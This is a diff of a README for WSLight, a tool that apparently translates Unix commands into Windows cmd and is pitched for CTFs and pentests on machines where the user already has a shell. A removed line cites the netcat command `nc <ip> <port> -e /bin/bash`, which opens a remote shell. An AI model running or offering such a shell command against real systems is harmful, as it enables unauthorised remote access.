@@ -1,7 +1,7 @@
 
 # WSLight
 
-Remote shell on windows with Unix command
+Unix command translator on Windows cmd (CLi)
 
 ##  Table of contents
 
@@ -12,7 +12,7 @@ Remote shell on windows with Unix command
 ## 🔦 Idea
 **Aim?**
 
-Providing equivalent of bash (Unix cmd) on Windows, like if we would launch `nc <ip> <port> -e /bin/bash`
+Providing equivalent of bash (Unix cmd) on Window
 
 > Powershell & cmd already exist!
 
@@ -22,21 +22,33 @@ Exactly, but if you are not very comfortable with it and you have more reference
 
 Yes but it requires  admin privileges to enable it. 
 
+**⚠️ Only a set of Unix command is available. I will provide more as things progress. Do not hesitate to let me know which one you will be interested in**
+*(Or a make a PR it is **simple**, just add a line in the `suggestions` slice (`cmd/wslight/main.go`) explaining what is the command, and  apply the command behavior in the `Translate` function (in `pkg/command/translate.go`)*
 
 
 **Use cases?**
 
  - CTF, pentest etc with remote shell on windows device
+ - Learn some `cmd.exe` command (by enabling debug with `+x`)
 
 
  ## 💺 Installation
 
  ## 🚀 Usage 
  
- WSLight uses 2 utility:
+Move `wslight.exe` binary on the windows machine on which you have a shell
 
- - wslight-cli: CLI used on your machine to interact with the windows machine
- - wslight: used on Windows machine to catch unix cmd from your machine and translate in Powershell
+### Launch the cli
+```
+wslight.exe
+```
+
+
+### Launch equivalent of unix command in `cmd.exe`
+Once th cli is launched
+```
+> <your_command> <your_argument>
+```
 
 ### Establish connection
 On windows machine launch the listener:
